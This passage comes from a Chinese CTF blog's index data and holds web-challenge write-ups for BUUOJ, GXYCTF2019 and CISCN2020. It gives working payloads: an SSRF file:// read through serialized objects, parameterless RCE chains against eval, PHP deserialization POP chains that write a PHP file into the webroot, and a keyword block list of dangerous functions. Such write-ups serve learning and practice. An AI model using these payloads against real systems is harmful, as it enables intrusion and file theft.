class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>get方法里有curl函数，翻翻手册：</p>\n<blockquote>\n<p>curl_init:初始化新的会话，返回 cURL 句柄，供curl_setopt()、 curl_exec()          和 curl_close() 函数使用。<br>curl_setopt:为 cURL 会话句柄设置选项。<br>curl_exec:执行给定的 cURL 会话。<br>curl_getinfo:获取最后一次传输的相关信息。 </p>\n</blockquote>\n<p>getBlogContents调用get方法<br>还有个waf限制注册时直接读取flag.php<br>来看get方法，curl会访问url并返回页面，而getBlogContents则调用get访问blog中的url，因此这里存在SSRF</p>\n<blockquote>\n<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p>\n</blockquote>\n<p>假如我们把url设定成我们想要的地址，就可以访问服务器内部文件。<br>结合我们前面得到的序列化，将123.com设定为file协议读取flag.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span>  </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">12</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"file:///var/www/html/flag.php\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$data = <span class=\"keyword\">new</span> UserInfo();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($data);</span><br><span class=\"line\"><span class=\"comment\">//O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:4:\"test\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>最后在view.php?no=1后面构造个联合查询<br><img src=\"https://img-blog.csdnimg.cn/20200527130555787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>源码返回base64字符串，解码即得flag<br><img src=\"https://img-blog.csdnimg.cn/20200527130650134.png\" alt=\"在这里插入图片描述\"><br>从<a href=\"https://www.cnblogs.com/kevinbruce656/p/12643338.html\" target=\"_blank\" rel=\"noopener\">这位师傅</a>学到了还有个非预期，在view.php?no=*中没有过滤load_file函数，导致可以直接读到flag.php，盲注下/var/www/html/flag.php位置字段即得flag。</p>\n","categories":["buu刷题"],"tags":["sql","serialize","代码审计"]},{"title":"GXYCTF2019——禁止套娃","url":"/2020/05/30/buu6%E2%80%94%E2%80%94%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/","content":"<p>平台：buuoj.cn<br>打开靶机<br><img src=\"https://img-blog.csdnimg.cn/2020053011052181.png\" alt=\"在这里插入图片描述\"><br>查看源码、http头没发现后用扫描器扫一下<br><img src=\"https://img-blog.csdnimg.cn/2020053011062272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>有git泄露，用githack把源码下下来<br><img src=\"https://img-blog.csdnimg.cn/20200530110750174.png\" alt=\"在这里插入图片描述\"><br>查看index.php源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"flag在哪里呢？&lt;br&gt;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'exp'</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">'/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i'</span>, $_GET[<span class=\"string\">'exp'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"string\">';'</span> === preg_replace(<span class=\"string\">'/[a-z,_]+\\((?R)?\\)/'</span>, <span class=\"keyword\">NULL</span>, $_GET[<span class=\"string\">'exp'</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class=\"string\">'exp'</span>])) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// echo $_GET['exp'];</span></span><br><span class=\"line\">                @<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'exp'</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"还差一点哦！\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"再好好想想！\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"还想读flag，臭弟弟！\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>分析一下<br>包含flag.php，get传参exp，第一个preg_match限制了一些伪协议禁止读取文件<br>接着是正则，(?R)引用当前表达式，(?R)?代表可以有引用，也可以没有，引用则变成<code>[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\)</code>的形式，可以一直迭代下去。这样可以匹配一些诸如print(echo(1))括号和字符组成的字符集<br>第二个preg_match正则掉了一些字眼，一些函数不可使用<br>考点是无参数RCE<br>解题之前先了解几个函数</p>\n<blockquote>\n<p>localeconv()：函数返回一包含本地数字及货币格式信息的数组。<br>scandir()：列出指定路径中的文件和目录<br>current()：返回数组中的当前单元, 默认取第一个值。<br>pos()：current() 的别名。<br>next()：把指向当前元素的指针移动到下一个元素的位置,并返回当前元素的值<br>array_reverse()：返回单元顺序相反的数组<br>highlight_file — 语法高亮一个文件</p>\n</blockquote>\n<p>我们知道index.php包含了一个flag.php，可以构造exp探测其存在：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?exp=print_r(scandir(current(localeconv())));</span><br><span class=\"line\">或者</span><br><span class=\"line\">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200530115039658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>所以我们的目标就变成了读取倒数第二个文件也就是flag.php。<br>这时可以利用array_reverse()先把数组的顺序颠倒，这时候index.php就变成了第一个元素，在用next()把指针移到index.php的下一个元素，也就是flag.php，这样，就达成了我们的目的<br>用highlight_file 输出</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))))</span><br></pre></td></tr></table></figure>\n<p>传入得到flag<br><img src=\"https://img-blog.csdnimg.cn/20200530120322629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>在<a href=\"https://www.cnblogs.com/wangtanzhi/p/12260986.html\" target=\"_blank\" rel=\"noopener\">王叹之师傅</a>wp里发现另外两个解法<br>1.用array_flip()以及array_rand()将flag.php从数组中随机出来</p>\n<blockquote>\n<p>array_flip — 交换数组中的键和值<br>从数组中随机取出一个或多个单元 </p>\n</blockquote>\n<p>传个三四次即可读出flag.php<br><img src=\"https://img-blog.csdnimg.cn/20200530120752558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2.session利用<br>启用PHPSESSID</p>\n<blockquote>\n<p>session_id ：获取/设置当前会话 ID<br>session_start ：启动新会话或者重用现有会话<br>构造</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?exp=readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>\n<p>并手动把cookie设成flag.php<br><img src=\"https://img-blog.csdnimg.cn/20200530122023966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>成功得到flag</p>\n","categories":["buu刷题"],"tags":["serialize","代码审计","无参数rce"]},{"title":"CISCN2020初赛web总结","url":"/2020/08/24/ciscn_online/","content":"<p>又是被大佬带飞的一天</p>\n<h3 id=\"babyphp\"><a href=\"#babyphp\" class=\"headerlink\" title=\"babyphp\"></a>babyphp</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"comment\">//题目环境：php:7.4.8-apache</span></span><br><span class=\"line\">    $pid = pcntl_fork();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($pid == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'could not fork'</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ($pid)&#123;</span><br><span class=\"line\">        $r=pcntl_wait($status);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class=\"line\">            phpinfo();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'a'</span>])&amp;&amp;is_string($_GET[<span class=\"string\">'a'</span>])&amp;&amp;!preg_match(<span class=\"string\">\"/[:\\\\\\\\]|exec|pcntl/i\"</span>,$_GET[<span class=\"string\">'a'</span>]))&#123;</span><br><span class=\"line\">            call_user_func_array($_GET[<span class=\"string\">'a'</span>],[$_GET[<span class=\"string\">'b'</span>],<span class=\"keyword\">false</span>,<span class=\"keyword\">true</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>父进程调用了pntcl_wait，之后调用pcntl_wifexited，子进程如果异常退出，父进程就会展示phpinfo，用一些disable_functionFuzz了一下a，直接到pfsockopen导致进程异常终止直接输出phpinfo了，Ctrl+f搜索flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/clip_image002.jpg\" alt=\"img\"></p>\n<p>大概就是函数造成回调使得进程异常退出，代码就执行phpinfo了，类似的函数还有stream_socket_client</p>\n<h3 id=\"babyunserialize\"><a href=\"#babyunserialize\" class=\"headerlink\" title=\"babyunserialize\"></a>babyunserialize</h3><p>dirsearch扫出<a href=\"http://www.zip，下载源码下来发现是和WMCTF2020\" target=\"_blank\" rel=\"noopener\">www.zip，下载源码下来发现是和WMCTF2020</a> webweb一样的框架，代码也没怎么改，所有利用链可以一样，<a href=\"http://blog.ccreater.top/\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<p>后来传入的时候发现把很多函数都过滤了，最后是想到phpinfo也算函数，再给它传个整数，成功得到phpinfo</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">DB</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">abstract</span> <span class=\"title\">class</span> <span class=\"title\">Cursor</span>  <span class=\"title\">implements</span> \\<span class=\"title\">IteratorAggregate</span> &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title\">namespace</span> <span class=\"title\">DB</span>\\<span class=\"title\">SQL</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">Mapper</span> <span class=\"title\">extends</span> \\<span class=\"title\">DB</span>\\<span class=\"title\">Cursor</span>&#123;</span><br><span class=\"line\">        <span class=\"title\">protected</span></span><br><span class=\"line\">            $<span class=\"title\">props</span>=[\"<span class=\"title\">quotekey</span>\"=&gt;\"<span class=\"title\">phpinfo</span>\"],</span><br><span class=\"line\">            $<span class=\"title\">adhoc</span>=[\"123\"=&gt;[\"<span class=\"title\">expr</span>\"=&gt;\"\"]],</span><br><span class=\"line\">            $<span class=\"title\">db</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">offsetExists</span><span class=\"params\">($offset)</span></span>&#123;&#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">offsetGet</span><span class=\"params\">($offset)</span></span>&#123;&#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">offsetSet</span><span class=\"params\">($offset, $value)</span></span>&#123;&#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">offsetUnset</span><span class=\"params\">($offset)</span></span>&#123;&#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getIterator</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($val)</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;db = $val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">CLI</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">Agent</span> &#123;</span><br><span class=\"line\">        <span class=\"title\">protected</span></span><br><span class=\"line\">            $<span class=\"title\">server</span>=\"\";</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $events;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;events=[<span class=\"string\">\"disconnect\"</span>=&gt;<span class=\"keyword\">array</span>(<span class=\"keyword\">new</span> \\DB\\SQL\\Mapper(<span class=\"keyword\">new</span> \\DB\\SQL\\Mapper(<span class=\"string\">\"\"</span>)),<span class=\"string\">\"find\"</span>)];</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;server=&amp;<span class=\"keyword\">$this</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WS</span></span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> &#123;</span><br><span class=\"line\">    <span class=\"title\">echo</span> <span class=\"title\">urlencode</span>(<span class=\"title\">serialize</span>(<span class=\"title\">array</span>(<span class=\"title\">new</span> \\<span class=\"title\">CLI</span>\\<span class=\"title\">WS</span>(),<span class=\"title\">new</span> \\<span class=\"title\">CLI</span>\\<span class=\"title\">Agent</span>())));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看着师傅们的wp分析下应该是预期解的笔记吧</p>\n<p>全局搜索destruct函数</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824160225.png\" alt=\"\"></p>\n<p>跟进write</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162040.png\" alt=\"\"></p>\n<p>又调用了Base的write方法，继续跟进</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162233.png\" alt=\"\"></p>\n<p>$file和$data都可控，exp:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162555.png\" alt=\"\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">DB</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Jig</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span></span><br><span class=\"line\">        FORMAT_JSON=<span class=\"number\">0</span>,</span><br><span class=\"line\">        FORMAT_Serialized=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span></span><br><span class=\"line\">        $dir = <span class=\"string\">'/var/www/html/'</span>,</span><br><span class=\"line\">        $format = <span class=\"keyword\">self</span>::FORMAT_JSON,</span><br><span class=\"line\">        $data = <span class=\"keyword\">array</span>(<span class=\"string\">\"blacknight.php\"</span>=&gt;<span class=\"keyword\">array</span>(<span class=\"string\">\"a\"</span>=&gt;<span class=\"string\">\"&lt;?php phpinfo();?&gt;\"</span>)),</span><br><span class=\"line\">        $lazy = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$jig = <span class=\"keyword\">new</span> Jig();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize($jig));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"rceme\"><a href=\"#rceme\" class=\"headerlink\" title=\"rceme\"></a>rceme</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">parserIfLabel($_GET[<span class=\"string\">'a'</span>]);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">danger_key</span><span class=\"params\">($s)</span> </span>&#123;</span><br><span class=\"line\">    $s=htmlspecialchars($s);</span><br><span class=\"line\">    $key=<span class=\"keyword\">array</span>(<span class=\"string\">'php'</span>,<span class=\"string\">'preg'</span>,<span class=\"string\">'server'</span>,<span class=\"string\">'chr'</span>,<span class=\"string\">'decode'</span>,<span class=\"string\">'html'</span>,<span class=\"string\">'md5'</span>,<span class=\"string\">'post'</span>,<span class=\"string\">'get'</span>,<span class=\"string\">'request'</span>,<span class=\"string\">'file'</span>,<span class=\"string\">'cookie'</span>,<span class=\"string\">'session'</span>,<span class=\"string\">'sql'</span>,<span class=\"string\">'mkdir'</span>,<span class=\"string\">'copy'</span>,<span class=\"string\">'fwrite'</span>,<span class=\"string\">'del'</span>,<span class=\"string\">'encrypt'</span>,<span class=\"string\">'$'</span>,<span class=\"string\">'system'</span>,<span class=\"string\">'exec'</span>,<span class=\"string\">'shell'</span>,<span class=\"string\">'open'</span>,<span class=\"string\">'ini_'</span>,<span class=\"string\">'chroot'</span>,<span class=\"string\">'eval'</span>,<span class=\"string\">'passthru'</span>,<span class=\"string\">'include'</span>,<span class=\"string\">'require'</span>,<span class=\"string\">'assert'</span>,<span class=\"string\">'union'</span>,<span class=\"string\">'create'</span>,<span class=\"string\">'func'</span>,<span class=\"string\">'symlink'</span>,<span class=\"string\">'sleep'</span>,<span class=\"string\">'ord'</span>,<span class=\"string\">'str'</span>,<span class=\"string\">'source'</span>,<span class=\"string\">'rev'</span>,<span class=\"string\">'base_convert'</span>);</span><br><span class=\"line\">    $s = str_ireplace($key,<span class=\"string\">\"*\"</span>,$s);</span><br><span class=\"line\">    $danger=<span class=\"keyword\">array</span>(<span class=\"string\">'php'</span>,<span class=\"string\">'preg'</span>,<span class=\"string\">'server'</span>,<span class=\"string\">'chr'</span>,<span class=\"string\">'decode'</span>,<span class=\"string\">'html'</span>,<span class=\"string\">'md5'</span>,<span class=\"string\">'post'</span>,<span class=\"string\">'get'</span>,<span class=\"string\">'request'</span>,<span class=\"string\">'file'</span>,<span class=\"string\">'cookie'</span>,<span class=\"string\">'session'</span>,<span class=\"string\">'sql'</span>,<span class=\"string\">'mkdir'</span>,<span class=\"string\">'copy'</span>,<span class=\"string\">'fwrite'</span>,<span class=\"string\">'del'</span>,<span class=\"string\">'encrypt'</span>,<span class=\"string\">'$'</span>,<span class=\"string\">'system'</span>,<span class=\"string\">'exec'</span>,<span class=\"string\">'shell'</span>,<span class=\"string\">'open'</span>,<span class=\"string\">'ini_'</span>,<span class=\"string\">'chroot'</span>,<span class=\"string\">'eval'</span>,<span class=\"string\">'passthru'</span>,<span class=\"string\">'include'</span>,<span class=\"string\">'require'</span>,<span class=\"string\">'assert'</span>,<span class=\"string\">'union'</span>,<span class=\"string\">'create'</span>,<span class=\"string\">'func'</span>,<span class=\"string\">'symlink'</span>,<span class=\"string\">'sleep'</span>,<span class=\"string\">'ord'</span>,<span class=\"string\">'str'</span>,<span class=\"string\">'source'</span>,<span class=\"string\">'rev'</span>,<span class=\"string\">'base_convert'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($danger <span class=\"keyword\">as</span> $val)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strpos($s,$val) !==<span class=\"keyword\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'很抱歉，执行出错，发现危险字符【'</span>.$val.<span class=\"string\">'】'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/^[a-z]$/i\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'很抱歉，执行出错，发现危险字符'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parserIfLabel</span><span class=\"params\">( $content )</span> </span>&#123;</span><br><span class=\"line\">    $pattern = <span class=\"string\">'/\\&#123;if:([\\s\\S]+?)&#125;([\\s\\S]*?)&#123;end\\s+if&#125;/'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class=\"line\">        $count = count( $matches[ <span class=\"number\">0</span> ] );</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( $i = <span class=\"number\">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class=\"line\">            $flag = <span class=\"string\">''</span>;</span><br><span class=\"line\">            $out_html = <span class=\"string\">''</span>;</span><br><span class=\"line\">            $ifstr = $matches[ <span class=\"number\">1</span> ][ $i ];</span><br><span class=\"line\">            $ifstr=danger_key($ifstr,<span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strpos($ifstr,<span class=\"string\">'='</span>) !== <span class=\"keyword\">false</span>)&#123;</span><br><span class=\"line\">                $arr= splits($ifstr,<span class=\"string\">'='</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>($arr[<span class=\"number\">0</span>]==<span class=\"string\">''</span> || $arr[<span class=\"number\">1</span>]==<span class=\"string\">''</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">'很抱歉，模板中有错误的判断,请修正【'</span>.$ifstr.<span class=\"string\">'】'</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                $ifstr = str_replace( <span class=\"string\">'='</span>, <span class=\"string\">'=='</span>, $ifstr );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $ifstr = str_replace( <span class=\"string\">'&lt;&gt;'</span>, <span class=\"string\">'!='</span>, $ifstr );</span><br><span class=\"line\">            $ifstr = str_replace( <span class=\"string\">'or'</span>, <span class=\"string\">'||'</span>, $ifstr );</span><br><span class=\"line\">            $ifstr = str_replace( <span class=\"string\">'and'</span>, <span class=\"string\">'&amp;&amp;'</span>, $ifstr );</span><br><span class=\"line\">            $ifstr = str_replace( <span class=\"string\">'mod'</span>, <span class=\"string\">'%'</span>, $ifstr );</span><br><span class=\"line\">            $ifstr = str_replace( <span class=\"string\">'not'</span>, <span class=\"string\">'!'</span>, $ifstr );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( preg_match( <span class=\"string\">'/\\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">'很抱歉，模板中有错误的判断,请修正'</span>.$ifstr);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                @<span class=\"keyword\">eval</span>( <span class=\"string\">'if('</span> . $ifstr . <span class=\"string\">')&#123;$flag=\"if\";&#125;else&#123;$flag=\"else\";&#125;'</span> );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( preg_match( <span class=\"string\">'/([\\s\\S]*)?\\&#123;else\\&#125;([\\s\\S]*)?/'</span>, $matches[ <span class=\"number\">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">switch</span> ( $flag ) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">case</span> <span class=\"string\">'if'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ( <span class=\"keyword\">isset</span>( $matches2[ <span class=\"number\">1</span> ] ) ) &#123;</span><br><span class=\"line\">                            $out_html .= $matches2[ <span class=\"number\">1</span> ];</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">case</span> <span class=\"string\">'else'</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ( <span class=\"keyword\">isset</span>( $matches2[ <span class=\"number\">2</span> ] ) ) &#123;</span><br><span class=\"line\">                            $out_html .= $matches2[ <span class=\"number\">2</span> ];</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">elseif</span> ( $flag == <span class=\"string\">'if'</span> ) 